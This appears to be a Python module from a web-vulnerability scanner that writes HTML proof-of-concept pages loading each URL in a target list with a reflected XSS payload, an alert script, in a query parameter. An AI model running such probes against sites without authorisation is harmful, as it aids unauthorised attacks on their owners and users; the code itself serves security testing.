import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def generate_xss_poc(url, param="q", payload="<script>alert('XSS')</script>"):
    test_url = f"{url}?{param}={payload}"
    
    html = f"""<html>
  <body>
    <h2>XSS Proof-of-Concept</h2>
    <iframe src="{test_url}" width="800" height="600"></iframe>
  </body>
</html>"""

    filename = f"xss_poc_{param}.html"
    with open(filename, "w") as f:
        f.write(html)

    log_to_text(f"[XSS_POC] {test_url} -> {filename}")
    ai_trigger_if_needed("XSS", test_url, payload, html, "high")
    print(f"[+] XSS PoC generisan: {filename}")
    return filename

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        targets = f.read().splitlines()
    
    for url in targets:
        generate_xss_poc(url)
